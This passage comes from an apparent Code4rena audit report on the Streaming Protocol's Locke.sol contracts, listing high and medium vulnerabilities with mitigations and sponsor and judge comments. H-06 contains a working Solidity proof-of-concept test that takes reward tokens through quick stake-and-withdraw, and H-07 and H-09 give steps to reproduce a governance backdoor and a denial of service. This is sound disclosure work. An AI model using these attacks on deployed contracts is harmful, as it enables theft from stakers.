`stake`:\n<https://github.com/code-423n4/2021-11-streaming/blob/main/Streaming/src/Locke.sol#L219:L222>\n\n    // accumulate reward per token info\n    cumulativeRewardPerToken = rewardPerToken();\n\n    // update user rewards\n    ts.rewards = earned(ts, cumulativeRewardPerToken);\n\nWhile the following line can be gamed in order to not stream any tokens (same withdraw tx).\n\nSpecifically an attacker can arrange to create a fraction less than zero thereby substracting zero.\n\n<https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L229>\n\n    ts.tokens -= uint112(acctTimeDelta * ts.tokens / (endStream - ts.lastUpdate));\n    // WARDEN TRANSLATION: (elapsedSecondsSinceStake * stakeAmount) / (endStreamTimestamp - stakeTimestamp)\n\nA succesful attack increases the share of rewardTokens of the attacker.\n\nThe attack can be repeated every block increasing the share further.\nThe attack could be done from multiple EOA increasing the share further.\nIn short: Attackers can create loss of funds for (honest) stakers.\n\nThe economic feasability of the attack depends on:\n\n*   staked amount (times number of attacks) vs total staked amount\n*   relative value of rewardToken to gasprice\n\n#### Proof of Concept\n\n##### code\n\nThe following was added to `Locke.t.sol` for the `StreamTest` Contract to simulate the attack from one EOA.\n```solidity\nfunction test_quickDepositAndWithdraw() public {\n    //// SETUP\n    // accounting (to proof attack): save the rewardBalance of alice.\n    uint StartBalanceA = testTokenA.balanceOf(address(alice));\n    uint112 stakeAmount = 10_000;\n\n    // start stream and fill it\n    (\n        uint32 maxDepositLockDuration,\n        uint32 maxRewardLockDuration,\n        uint32 maxStreamDuration,\n        uint32 minStreamDuration\n    ) = defaultStreamFactory.streamParams();\n\n    uint64 nextStream = defaultStreamFactory.currStreamId();\n    Stream stream = defaultStreamFactory.createStream(\n        address(testTokenA),\n        address(testTokenB),\n        uint32(block.timestamp + 10), \n        maxStreamDuration,\n        maxDepositLockDuration,\n        0,\n        false\n        // false,\n        // bytes32(0)\n    );\n    \n    testTokenA.approve(address(stream), type(uint256).max);\n    stream.fundStream(1_000_000_000);\n\n    // wait till the stream starts\n    hevm.warp(block.timestamp + 16);\n    hevm.roll(block.number + 1);\n\n    // just interact with contract to fill \"lastUpdate\" and \"ts.lastUpdate\" \n// without changing balances inside of Streaming contract\n    alice.doStake(stream, address(testTokenB), stakeAmount);\n    alice.doWithdraw(stream, stakeAmount);\n\n\n    ///// ATTACK COMES HERE\n    // stake\n    alice.doStake(stream, address(testTokenB), stakeAmount);\n\n    // wait a block\n    hevm.roll(block.number + 1);\n    hevm.warp(block.timestamp + 16);\n\n    // withdraw soon thereafter\n    alice.doWithdraw(stream, stakeAmount);\n\n    // finish the stream\n    hevm.roll(block.number + 9999);\n    hevm.warp(block.timestamp + maxDepositLockDuration);\n\n    // get reward\n    alice.doClaimReward(stream);\n\n\n    // accounting (to proof attack): save the rewardBalance of alice / save balance of stakeToken\n    uint EndBalanceA = testTokenA.balanceOf(address(alice));\n    uint EndBalanceB = testTokenB.balanceOf(address(alice));\n\n    // Stream returned everything we gave it\n    // (doStake sets balance of alice out of thin air => we compare end balance against our (thin air) balance)\n    assert(stakeAmount == EndBalanceB);\n\n    // we gained reward token without risk\n    assert(StartBalanceA == 0);\n    assert(StartBalanceA < EndBalanceA);\n    emit log_named_uint(\"alice gained\", EndBalanceA);\n}\n```\n\n##### commandline\n\n```zsh\n    dapp test --verbosity=2 --match \"test_quickDepositAndWithdraw\" 2> /dev/null\n    Running 1 tests for src/test/Locke.t.sol:StreamTest\n    [PASS] test_quickDepositAndWithdraw() (gas: 4501209)\n\n    Success: test_quickDepositAndWithdraw\n\n      alice gained: 13227\n```\n#### Tools Used\n\ndapptools\n\n#### Recommended Mitigation Steps\n\nEnsure staked tokens can not generate reward tokens without streaming deposit tokens. First idea that comes to mind is making following line\n`https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L220`\ndependable on a positive amount > 0 of:\n`https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L229`\n\n**[brockelmore (Streaming Protocol) confirmed](https://github.com/code-423n4/2021-11-streaming-findings/issues/166)**\n\n## [[H-07] Business logic bug in __abdicate() function - 2 Bugs](https://github.com/code-423n4/2021-11-streaming-findings/issues/132)\n_Submitted by cyberboy, also found by Meta0xNull_\n\n#### Impact\n\nThe `\\__abdicate()` function at <https://github.com/code-423n4/2021-11-streaming/blob/main/Streaming/src/Locke.sol#L46-L50> is the logic to remove the governance i.e., to renounce governance. However, the function logic does not consider emergency governor and pending governor, which can be a backdoor as only the \"gov\" is set to zero address while the emergency and pending gov remains. A pending gov can just claim and become the gov again, replacing the zero address.\n\n#### Proof of Concept\n\n1.  Compile the contract and set the `\\_GOVERNOR` and `\\_EMERGENCY_GOVERNOR`.\n2.  Now set a `pendingGov` but do not call `acceptGov()`\n\nBug 1\n3. Call the `\\__abdicate()` function and we will notice only \"gov\" is set to zero address while emergency gov remains.\n\nBug2\n4. Now use the address used in `pendingGov` to call `acceptGov()` function.\n5. We will notice the new gov has been updated to the new address from the zero address.\n\nHence the `\\__abdicate()` functionality can be used as a backdoor using emergency governor or leaving a pending governor to claim later.\n\n#### Tools Used\n\nRemix to test the proof of concept.\n\n#### Recommended Mitigation Steps\n\nThe `\\__abdicate()` function should set `emergency_gov` and `pendingGov` as well to zero address.\n\n**[brockelmore (Streaming Protocol) confirmed and disagreed with severity](https://github.com/code-423n4/2021-11-streaming-findings/issues/132#issuecomment-986938323):**\n > Yes, the governor can be recovered from abdication if pendingGov != 0 as well as emergency gov needs to be set to 0 before abdication because it won't be able to abdicate itself.\n> \n> Would consider it to be medium risk because chances of it ever being called are slim as it literally would cutoff the protocol from being able to capture its fees.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2021-11-streaming-findings/issues/132#issuecomment-1013518527):**\n > Given that the functionality and vulnerability exists, and the governor does claim fees, this could lead to the loss of funds. Based on the documentation for C4, that would qualify as high severity. \n> \n> `\n> 3 — High: Assets can be stolen/lost/compromised directly (or indirectly if there is a valid attack path that does not have hand-wavy hypotheticals).\n> `\n\n\n\n## [[H-08] ts.tokens sometimes calculated incorrectly](https://github.com/code-423n4/2021-11-streaming-findings/issues/123)\n_Submitted by gpersoon, also found by WatchPug_\n\n#### Impact\n\nSuppose someone stakes some tokens and then withdraws all of his tokens (he can still withdraw). This will result in ts.tokens being 0.\n\nNow after some time he stakes some tokens again.\nAt the second stake `updateStream()` is called and the following if condition is false because `ts.tokens==0`\n\n```JS\n  if (acctTimeDelta > 0 && ts.tokens > 0) {\n```\n\nThus `ts.lastUpdate` is not updated and stays at the value from the first withdraw.\nNow he does a second withdraw. `updateStream()` is called an calculates the updated value of `ts.tokens`.\nHowever it uses `ts.lastUpdate`, which is the time from the first withdraw and not from the second stake. So the value of `ts.token` is calculated incorrectly.\nThus more tokens can be withdrawn than you are supposed to be able to withdraw.\n\n#### Proof of Concept\n\n<https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L417-L447>\n\n```JS\nfunction stake(uint112 amount) public lock updateStream(msg.sender) {\n    ...         \n    uint112 trueDepositAmt = uint112(newBal - prevBal);\n    ... \n    ts.tokens += trueDepositAmt;\n```\n\n<https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L455-L479>\n\n```JS\nfunction withdraw(uint112 amount) public lock updateStream(msg.sender) {\n    ...\n    ts.tokens -= amount;\n```\n\n<https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L203-L250>\n\n```JS\nfunction updateStreamInternal(address who) internal {\n...\nuint32 acctTimeDelta = uint32(block.timestamp) - ts.lastUpdate;\n    if (acctTimeDelta > 0 && ts.tokens > 0) {\n        // some time has passed since this user last interacted\n        // update ts not yet streamed\n        ts.tokens -= uint112(acctTimeDelta * ts.tokens / (endStream - ts.lastUpdate));\n        ts.lastUpdate = uint32(block.timestamp);\n    }\n```\n\n#### Recommended Mitigation Steps\n\nChange the code in updateStream()  to:\n\n```JS\nif (acctTimeDelta > 0 ) {\n    // some time has passed since this user last interacted\n    // update ts not yet streamed\n    if (ts.tokens > 0) \n            ts.tokens -= uint112(acctTimeDelta * ts.tokens / (endStream - ts.lastUpdate));\n    ts.lastUpdate = uint32(block.timestamp);  // always update ts.lastUpdate (if time has elapsed)\n}\n```\n\nNote: the next if statement with unstreamed and lastUpdate can be changed in a similar way to save some gas\n\n**[brockelmore (Streaming Protocol) confirmed](https://github.com/code-423n4/2021-11-streaming-findings/issues/123#issuecomment-986945392):**\n > Nice catch :)\n\n\n\n## [[H-09] DOS while dealing with erc20 when value(i.e amount*decimals)  is high but less than type(uint112).max](https://github.com/code-423n4/2021-11-streaming-findings/issues/228)\n_Submitted by hack3r-0m_\n\n#### Impact\n\n<https://github.com/code-423n4/2021-11-streaming/blob/main/Streaming/src/Locke.sol#L229>\n\nreverts due to overflow for higher values (but strictly less than type(uint112).max) and hence when user calls `exit` or `withdraw` function it will revert and that user will not able to withdraw funds permanentaly.\n\n#### Proof of Concept\n\nAttaching diff to modify tests to reproduce behaviour:\n\n```\ndiff --git a/Streaming/src/test/Locke.t.sol b/Streaming/src/test/Locke.t.sol\nindex 2be8db0..aba19ce 100644\n--- a/Streaming/src/test/Locke.t.sol\n+++ b/Streaming/src/test/Locke.t.sol\n@@ -166,14 +166,14 @@ contract StreamTest is LockeTest {\n         );\n \n         testTokenA.approve(address(stream), type(uint256).max);\n-        stream.fundStream((10**14)*10**18);\n+        stream.fundStream(1000);\n \n-        alice.doStake(stream, address(testTokenB), (10**13)*10**18);\n+        alice.doStake(stream, address(testTokenB), 100);\n \n \n         hevm.warp(startTime + minStreamDuration / 2); // move to half done\n         \n-        bob.doStake(stream, address(testTokenB), (10**13)*10**18);\n+        bob.doStake(stream, address(testTokenB), 100);\n \n         hevm.warp(startTime + minStreamDuration / 2 + minStreamDuration / 10);\n \n@@ -182,10 +182,10 @@ contract StreamTest is LockeTest {\n         hevm.warp(startTime + minStreamDuration + 1); // warp to end of stream\n \n \n-        // alice.doClaimReward(stream);\n-        // assertEq(testTokenA.balanceOf(address(alice)), 533*(10**15));\n-        // bob.doClaimReward(stream);\n-        // assertEq(testTokenA.balanceOf(address(bob)), 466*(10**15));\n+        alice.doClaimReward(stream);\n+        assertEq(testTokenA.balanceOf(address(alice)), 533);\n+        bob.doClaimReward(stream);\n+        assertEq(testTokenA.balanceOf(address(bob)), 466);\n     }\n \n     function test_stake() public {\ndiff --git a/Streaming/src/test/utils/LockeTest.sol b/Streaming/src/test/utils/LockeTest.sol\nindex eb38060..a479875 100644\n--- a/Streaming/src/test/utils/LockeTest.sol\n+++ b/Streaming/src/test/utils/LockeTest.sol\n@@ -90,11 +90,11 @@ abstract contract LockeTest is TestHelpers {\n         testTokenA = ERC20(address(new TestToken(\"Test Token A\", \"TTA\", 18)));\n         testTokenB = ERC20(address(new TestToken(\"Test Token B\", \"TTB\", 18)));\n         testTokenC = ERC20(address(new TestToken(\"Test Token C\", \"TTC\", 18)));\n-        write_balanceOf_ts(address(testTokenA), address(this), (10**14)*10**18);\n-        write_balanceOf_ts(address(testTokenB), address(this), (10**14)*10**18);\n-        write_balanceOf_ts(address(testTokenC), address(this), (10**14)*10**18);\n-        assertEq(testTokenA.balanceOf(address(this)), (10**14)*10**18);\n-        assertEq(testTokenB.balanceOf(address(this)), (10**14)*10**18);\n+        write_balanceOf_ts(address(testTokenA), address(this), 100*10**18);\n+        write_balanceOf_ts(address(testTokenB), address(this), 100*10**18);\n+        write_balanceOf_ts(address(testTokenC), address(this), 100*10**18);\n+        assertEq(testTokenA.balanceOf(address(this)), 100*10**18);\n+        assertEq(testTokenB.balanceOf(address(this)), 100*10**18);\n \n         defaultStreamFactory = new StreamFactory(address(this), address(this));\n \n```\n\n#### Tools Used\n\nManual Review\n\n#### Recommended Mitigation Steps\n\nConsider doing arithmetic operations in two steps or upcasting to u256 and then downcasting. Alternatively, find a threshold where it breaks and add require condition to not allow total stake per user greater than threshhold.\n\n**[brockelmore (Streaming Protocol) confirmed](https://github.com/code-423n4/2021-11-streaming-findings/issues/228)** \n\n\n## [[H-10] recoverTokens doesn't work when isSale is true](https://github.com/code-423n4/2021-11-streaming-findings/issues/121)\n_Submitted by harleythedog, also found by kenzo, pedroais, hyh, and pauliax_\n\n#### Impact\n\nIn `recoverTokens`, the logic to calculate the excess number of deposit tokens in the contract is:\n\n    uint256 excess = ERC20(token).balanceOf(address(this)) - (depositTokenAmount - redeemedDepositTokens);\n\nThis breaks in the case where isSale is true and the deposit tokens have already been claimed through the use of `creatorClaimSoldTokens`. In this case, `redemeedDepositTokens` will be zero, and `depositTokenAmount` will still be at its original value when the streaming ended. As a result, any attempts to recover deposit tokens from the contract would either revert or send less tokens than should be sent, since the logic above would still think that there are the full amount of deposit tokens in the contract. This breaks the functionality of the function completely in this case.\n\n#### Proof of Concept\n\nSee the excess calculation here: <https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L654>\n\nSee `creatorClaimSoldTokens` here: <https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L583>\n\nNotice that `creatorClaimSoldTokens` does not change `depositTokenAmount` or `redeemedDepositTokens`, so the excess calculation will be incorrect in the case of sales.\n\n#### Tools Used\n\nInspection\n\n#### Recommended Mitigation Steps\n\nI would recommend setting `redeemedDepositTokens` to be `depositTokenAmount` in the function `creatorClaimSoldTokens`, since claiming the sold tokens is like \"redeeming\" them in a sense. This would fix the logic issue in `recoverTokens`.\n\n**[brockelmore (Streaming Protocol) commented](https://github.com/code-423n4/2021-11-streaming-findings/issues/121#issuecomment-989284471)**\n\n**[0xean (judge) commented](https://github.com/code-423n4/2021-11-streaming-findings/issues/121#issuecomment-1013574494):**\n > upgrading to High as assets would be lost in the case outlined by the warden\n> \n> `\n> 3 — High: Assets can be stolen/lost/compromised directly (or indirectly if there is a valid attack path that does not have hand-wavy hypotheticals).\n> `\n\n\n\n \n# Medium Risk Findings (5)\n## [[M-01] LockeERC20 is vulnerable to frontrun attack](https://github.com/code-423n4/2021-11-streaming-findings/issues/55)\n_Submitted by egjlmn1, also found by itsmeSTYJ, toastedsteaksandwich, and WatchPug_\n\n#### Impact\n\nA user can steal another user's tokens if he frontrun before he changes the allowance.\n\nThe `approve()` function receives an amount to change to.\nLets say user A approved user B to take N tokens, and now he wants to change from N to M, if he calls `approve(M)` the attacker can frontrun, take the N tokens, wait until after the approve transaction, and take another M tokens. And taking N tokens more than the user wanted.\n\n#### Tools Used\n\nManual code review\n\n#### Recommended Mitigation Steps\n\nChange the approve function to either accept the old amount of allowance and require the current allowance to be equal to that, or change to two different functions that increase and decrease the allowance instead of straight on changing it.\n\n**[brockelmore (Streaming Protocol) acknowledged and disagreed with severity](https://github.com/code-423n4/2021-11-streaming-findings/issues/55)**\n\n**[0xean (judge) commented](https://github.com/code-423n4/2021-11-streaming-findings/issues/55#issuecomment-1013524455):**\n > Front running of the `approve` ERC20 function is pretty well documented and this point and there are some good ways to mitigate this risk.  I am going to downgrade to Medium since there are some other requirements for this to actual mean that assets have been lost\n> `\n> 2 — Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n> `\n\n\n\n## [[M-02] Any arbitraryCall gathered airdrop can be stolen with recoverTokens](https://github.com/code-423n4/2021-11-streaming-findings/issues/162)\n_Submitted by hyh_\n\n#### Impact\n\nAny airdrop gathered with `arbitraryCall` will be immediately lost as an attacker can track `arbitraryCall` transactions and back run them with calls to `recoverTokens`, which doesn't track any tokens besides reward, deposit and incentive tokens, and will give the airdrop away.\n\n#### Proof of Concept\n\n`arbitraryCall` requires that tokens to be gathered shouldn't be reward, deposit or incentive tokens:\n<https://github.com/code-423n4/2021-11-streaming/blob/main/Streaming/src/Locke.sol#L735>\n\nAlso, the function doesn't mark gathered tokens in any way. Thus, the airdrop is freely accessible for anyone to be withdrawn with `recoverTokens`:\n<https://github.com/code-423n4/2021-11-streaming/blob/main/Streaming/src/Locke.sol#L687>\n\n#### Recommended Mitigation Steps\n\nAdd airdrop tokens balance mapping, record what is gathered in `arbitraryCall` and prohibit their free withdrawal in `recoverTokens` similarly to incentives\\[].\n\nNow:\n\n```solidity\nmapping (address => uint112) public incentives;\n...\nfunction recoverTokens(address token, address recipient) public lock {\n...\n\t\tif (incentives[token] > 0) {\n\t\t\t...\n\t\t\tuint256 excess = ERC20(token).balanceOf(address(this)) - incentives[token];\n\t\t\t...\n\t\t}\n\n```\n\nTo be:\n```solidity\nmapping (address => uint112) public incentives;\nmapping (address => uint112) public airdrops;\n...\nfunction recoverTokens(address token, address recipient) public lock {\n...\n    if (incentives[token] > 0) {\n        ...\n        uint256 excess = ERC20(token).balanceOf(address(this)) - incentives[token];\n        ...\n    }\n    if (airdrops[token] > 0) {\n        ...\n        uint256 excess = ERC20(token).balanceOf(address(this)) - airdrops[token];\n        ...\n    }\n...\n// we do know what airdrop token will be gathered\nfunction arbitraryCall(address who, bytes memory data, address token) public lock externallyGoverned {\n    ...\n\n    // get token balances\n    uint256 preDepositTokenBalance = ERC20(depositToken).balanceOf(address(this));\n    uint256 preRewardTokenBalance = ERC20(rewardToken).balanceOf(address(this));\n    uint256 preAirdropBalance = ERC20(token).balanceOf(address(this));\n\n    (bool success, bytes memory _ret) = who.call(data);\n    require(success);\n    \n    uint256 postAirdropBalance = ERC20(token).balanceOf(address(this));\n    require(postAirdropBalance <= type(uint112).max, \"air_112\");\n    uint112 amt = uint112(postAirdropBalance - preAirdropBalance);\n    require(amt > 0, \"air\");\n    airdrops[token] += amt;\n```\n\n**[brockelmore (Streaming Protocol) disputed](https://github.com/code-423n4/2021-11-streaming-findings/issues/162#issuecomment-987041410):**\n > The intention is that the claim airdrop + transfer is done atomically. Compound-style governance contracts come with this ability out of the box.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2021-11-streaming-findings/issues/162#issuecomment-1013571214):**\n > Going to agree with the warden that as the code is written this is an appropriate risk to call out and be aware of.  Downgrading in severity because it relies on external factors but there is no on chain enforcement that this call will be operated correctly and therefore believe it represent a valid concern even if the Sponsor has a mitigation plan in place.\n\n\n\n## [[M-03] This protocol doesn't support all fee on transfer tokens](https://github.com/code-423n4/2021-11-streaming-findings/issues/192)\n_Submitted by 0x0x0x_\n\nSome fee on transfer tokens, do not reduce the fee directly from the transferred amount, but subtracts it from remaining balance of sender. Some tokens prefer this approach, to make the amount received by the recipient an exact amount. Therefore, after funds are send to users, balance becomes less than it should be. So this contract does not fully support fee on transfer tokens. With such tokens, user funds can get lost after transfers.\n\n#### Mitigation step\n\nI don't recommend directly claiming to support fee on transfer tokens. Current contract only supports them, if they reduce the fee from the transfer amount.\n\n**[brockelmore (Streaming Protocol) acknowldedged](https://github.com/code-423n4/2021-11-streaming-findings/issues/192#issuecomment-989261382):**\n > We will make this clear for stream creators\n\n\n\n## [[M-04] arbitraryCall() can get blocked by an attacker](https://github.com/code-423n4/2021-11-streaming-findings/issues/47)\n_Submitted by GiveMeTestEther, also found by ScopeLift_\n\n#### Impact\n\n`arbitraryCall()`'s (L733) use case is to claim airdrops by \"gov\". If the address \"who\" is a token that could be send as an incentive by an attacker via `createIncentive()` then such claim can be made unusable, because on L735 there is a `require(incentives\\[who] == 0, \"inc\");` that reverts if a \"who\" token was received as an incentive.\n\nIn this case the the `incentives\\[who]` can be set to 0 by the stream creator by calling `claimIncentive()` but only after the stream has ended according to `require(block.timestamp >= endStream, \"stream\");` (L520)\n\nIf the airdrop is only claimable before the end of the stream, then the airdrop can never be claimed.\n\nIf \"gov\" is not the stream creator then the stream creator must become also the \"gov\" because `claimIncentive()` only can be called by the stream creator and the `arbitraryCall()` only by \"gov\". If resetting `incentives\\[who]` to 0 by calling `claimIncentive()` and `arbitraryCall()` for the \"who\" address doesn't happen atomic, an attacker can send between those two calls again a \"who\" token.\n\n#### Proof of Concept\n\n- <https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L733>\n\n- <https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L500>\n\n#### Recommended Mitigation Steps\n\n*   Best option at the moment I can think of is to accept the risk but clearly communicate to users that this can happen\n\n**[brockelmore (Streaming Protocol) acknowledged](https://github.com/code-423n4/2021-11-streaming-findings/issues/47#issuecomment-984102392):**\n > Yep this is the tradeoff being made. To maintain trustlessness, we cannot remove the `incentives[who] == 0` check. Additionally, governance shouldn't be in charge of an arbitrary stream's `recoverTokens` function. \n> \n> The upshot of this is most `MerkleDrop` contracts are generally external of the token itself and not baked into the ERC20 itself. If a user wants to grief governance, they could continuously `createIncentive` after the stream creator claims the previous. But it does cost the user.\n\n\n\n## [[M-05] Storage variable unstreamed can be artificially inflated](https://github.com/code-423n4/2021-11-streaming-findings/issues/118)\n_Submitted by harleythedog, also found by csanuragjain, gpersoon, hubble, and WatchPug_\n\n#### Impact\n\nThe storage variable `unstreamed` keeps track of the global amount of deposit token in the contract that have not been streamed yet. This variable is a public variable, and users that read this variable likely want to use its value to determine whether or not they want to stake in the stream.\n\nThe issue here is that `unstreamed` is incremented on calls to `stake`, but it is not being decremented on calls to `withdraw`. As a result, a malicious user could simply stake, immediately withdraw their staked amount, and they will have increased `unstreamed`. They could do this repeatedly or with large amounts to intentionally inflate `unstreamed` to be as large as they want.\n\nOther users would see this large amount and be deterred to stake in the stream, since they would get very little reward relative to the large amount of unstreamed deposit tokens that *appear* to be in the contract. This benefits the attacker as less users will want to stake in the stream, which leaves more rewards for them.\n\n#### Proof of Concept\n\nSee `stake` here: <https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L417>\n\nSee `withdraw` here: <https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L455>\n\nNotice that `stake` increments `unstreamed` but `withdraw` does not affect `unstreamed` at all, even though `withdraw` is indeed removing unstreamed deposit tokens from the contract.\n\n#### Tools Used\n\nInspection\n\n#### Recommended Mitigation Steps\n\nAdd the following line to `withdraw` to fix this issue:\n\n    unstreamed -= amount;\n\n**[brockelmore (Streaming Protocol) confirmed](https://github.com/code-423n4/2021-11-streaming-findings/issues/118#issuecomment-989286529)**\n\n# Low Risk Findings (27)\n- [[L-01] Avoid fee ](https://github.com/code-423n4/2021-11-streaming-findings/issues/145) _Submitted by Jujic_\n- [[L-02] Loss of precision causing incorrect flashloan & creator fee calculation](https://github.com/code-423n4/2021-11-streaming-findings/issues/221) _Submitted by hack3r-0m, also found by Jujic and toastedsteaksandwich_\n- [[L-03] Missing address(0) check can, lead to user transfering token to the burn address, and doesnt reduce the total supply](https://github.com/code-423n4/2021-11-streaming-findings/issues/136) _Submitted by Omik, also found by pauliax_\n- [[L-04] Missing zero Address check ](https://github.com/code-423n4/2021-11-streaming-findings/issues/26) _Submitted by cyberboy_\n- [[L-05] Token owner cannot claim rewardToken if they are not the original depositor](https://github.com/code-423n4/2021-11-streaming-findings/issues/204) _Submitted by gzeon_\n- [[L-06] Stream.sol: possible tx.origin attack vector via recoverTokens()](https://github.com/code-423n4/2021-11-streaming-findings/issues/73) _Submitted by itsmeSTYJ_\n- [[L-07] constructor should guard against zero addresses](https://github.com/code-423n4/2021-11-streaming-findings/issues/20) _Submitted by jayjonah8_\n- [[L-08] Incorrect Validation of feePercent](https://github.com/code-423n4/2021-11-streaming-findings/issues/246) _Submitted by mtz, also found by hubble and kenzo_\n- [[L-09] Free flashloan for governance](https://github.com/code-423n4/2021-11-streaming-findings/issues/66) _Submitted by 0x1f8b_\n- [[L-10] Inaccuate comment about claimFees()](https://github.com/code-423n4/2021-11-streaming-findings/issues/94) _Submitted by GeekyLumberjack_\n- [[L-11] depositTokens need to have a decimals() function](https://github.com/code-423n4/2021-11-streaming-findings/issues/41) _Submitted by GiveMeTestEther_\n- [[L-12] TODOs List May Leak Important Info & Errors](https://github.com/code-423n4/2021-11-streaming-findings/issues/78) _Submitted by Meta0xNull, also found by robee and pauliax_\n- [[L-13] Governance has the ability to withdraw tokens the stream doesn't know about](https://github.com/code-423n4/2021-11-streaming-findings/issues/112) _Submitted by Ruhum_\n- [[L-14] Inaccurate comment in `recoverTokens`](https://github.com/code-423n4/2021-11-streaming-findings/issues/213) _Submitted by cmichel_\n- [[L-15] Division before multiple can lead to precision errors](https://github.com/code-423n4/2021-11-streaming-findings/issues/28) _Submitted by cyberboy_\n- [[L-16] flashLoan does not have a return statement](https://github.com/code-423n4/2021-11-streaming-findings/issues/114) _Submitted by defsec_\n- [[L-17] Use of ecrecover is susceptible to signature malleability](https://github.com/code-423n4/2021-11-streaming-findings/issues/117) _Submitted by defsec_\n- [[L-18] Incompatibility With Rebasing/Deflationary/Inflationary tokens](https://github.com/code-423n4/2021-11-streaming-findings/issues/252) _Submitted by defsec_\n- [[L-19] prevent rounding error](https://github.com/code-423n4/2021-11-streaming-findings/issues/124) _Submitted by gpersoon_\n- [[L-20] balance(dust) rewardsTokens may be unclaimable after endRewardLock](https://github.com/code-423n4/2021-11-streaming-findings/issues/271) _Submitted by hubble_\n- [[L-21] Floating Pragma is set.](https://github.com/code-423n4/2021-11-streaming-findings/issues/19) _Submitted by cyberboy, also found by Jujic, defsec, hyh, robee, and mtz_\n- [[L-22] Missing zero-address checks on LockeERC20 and Stream construction](https://github.com/code-423n4/2021-11-streaming-findings/issues/68) _Submitted by hyh, also found by Meta0xNull and 0x1f8b_\n- [[L-23] `rewardPerToken()` reverts before start time.](https://github.com/code-423n4/2021-11-streaming-findings/issues/147) _Submitted by jonah1005_\n- [[L-24] Wrong comment in claimReward](https://github.com/code-423n4/2021-11-streaming-findings/issues/102) _Submitted by kenzo_\n- [[L-25] Global unstreamed variable not kept up to date](https://github.com/code-423n4/2021-11-streaming-findings/issues/98) _Submitted by kenzo_\n- [[L-26] parameter \"who\" not used](https://github.com/code-423n4/2021-11-streaming-findings/issues/125) _Submitted by gpersoon, also found by GiveMeTestEther, pauliax, pedroais, Meta0xNull, bitbopper, hack3r-0m, and wuwe1_\n- [[L-27] LockeERC20 name is not implemented as comment imply](https://github.com/code-423n4/2021-11-streaming-findings/issues/110) _Submitted by wuwe1_\n\n# Non-Critical Findings (23)\n- [[N-23] Deny of service because integer overflow](https://github.com/code-423n4/2021-11-streaming-findings/issues/65) _Submitted by 0x1f8b_\n- [[N-01] Missing contract check on `rewardtoken`](https://github.com/code-423n4/2021-11-streaming-findings/issues/140) _Submitted by Omik_\n- [[N-02] creatorClaimSoldTokens() Does Not Check Destination Address](https://github.com/code-423n4/2021-11-streaming-findings/issues/77) _Submitted by Meta0xNull_\n- [[N-03] Incentives paid to creator instead of depositor](https://github.com/code-423n4/2021-11-streaming-findings/issues/201) _Submitted by gzeon_\n- [[N-04] Governed.sol: setPendingGov() should use the emergency_governed modifier.](https://github.com/code-423n4/2021-11-streaming-findings/issues/72) _Submitted by itsmeSTYJ_\n- [[N-05] Use _notSameBlock](https://github.com/code-423n4/2021-11-streaming-findings/issues/62) _Submitted by 0x1f8b_\n- [[N-06] Missing address(0) check, can crippled the governed functions](https://github.com/code-423n4/2021-11-streaming-findings/issues/135) _Submitted by Omik_\n- [[N-07] Flash loan mechanics do not implement any standard](https://github.com/code-423n4/2021-11-streaming-findings/issues/130) _Submitted by hyh_\n- [[N-08] `LockeERC20.transfer()` and `LockeERC20.transferFrom()` emit `Transfer` events when the transferred amount is zero](https://github.com/code-423n4/2021-11-streaming-findings/issues/150) _Submitted by pants_\n- [[N-09] `LockeERC20.transferFrom()` emits `Transfer` events when `from` equals `to`](https://github.com/code-423n4/2021-11-streaming-findings/issues/151) _Submitted by pants_\n- [[N-10] `LockeERC20.approve()` and `LockeERC20.permit()` emit `Approval` events when the allowence hasn't changed](https://github.com/code-423n4/2021-11-streaming-findings/issues/153) _Submitted by pants_\n- [[N-11] `Governed.setPendingGov()` emits `NewPendingGov` events when the pending governor hasn't changed](https://github.com/code-423n4/2021-11-streaming-findings/issues/157) _Submitted by pants_\n- [[N-12] `Governed.acceptGov()` emits `NewGov` events when the governor hasn't changed](https://github.com/code-423n4/2021-11-streaming-findings/issues/158) _Submitted by pants_\n- [[N-13] `Governed`'s constructor doesn't emit an initial `NewGov` event](https://github.com/code-423n4/2021-11-streaming-findings/issues/159) _Submitted by pants_\n- [[N-14] `Governed` doesn't implement the `IGoverned` interface](https://github.com/code-423n4/2021-11-streaming-findings/issues/161) _Submitted by pants_\n- [[N-15] Implementations should inherit their interface](https://github.com/code-423n4/2021-11-streaming-findings/issues/234) _Submitted by WatchPug_\n- [[N-16] Constructors should not have visibility](https://github.com/code-423n4/2021-11-streaming-findings/issues/236) _Submitted by WatchPug_\n- [[N-17] Insufficient input validation](https://github.com/code-423n4/2021-11-streaming-findings/issues/243) _Submitted by WatchPug_\n- [[N-18] Inconsistent check of token balance](https://github.com/code-423n4/2021-11-streaming-findings/issues/249) _Submitted by WatchPug_\n- [[N-19] Emergency gov is never used](https://github.com/code-423n4/2021-11-streaming-findings/issues/226) _Submitted by csanuragjain, also found by kenzo and wuwe1_\n- [[N-20] Missing NatSpec comments](https://github.com/code-423n4/2021-11-streaming-findings/issues/32) _Submitted by cyberboy_\n- [[N-21] Missing Emit in critical function](https://github.com/code-423n4/2021-11-streaming-findings/issues/35) _Submitted by 